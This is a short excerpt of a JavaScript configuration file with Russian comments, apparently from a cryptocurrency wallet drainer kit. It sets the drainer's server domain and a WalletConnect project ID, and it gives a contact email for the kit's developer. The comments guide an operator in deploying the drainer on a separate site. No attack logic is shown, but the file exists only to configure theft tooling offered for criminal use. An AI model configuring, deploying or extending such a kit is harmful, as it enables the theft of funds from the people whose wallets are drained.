...
// Сообщите разработчику по электронной почте: m-steal@internet.ru
...
const MS_Server = "noahserver.xyz"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
const MS_WalletConnect_ID = "033336ea29d8011518aebe1e7c2f86da"; // Project ID из WalletConnect Cloud (лучше поменять на свой)
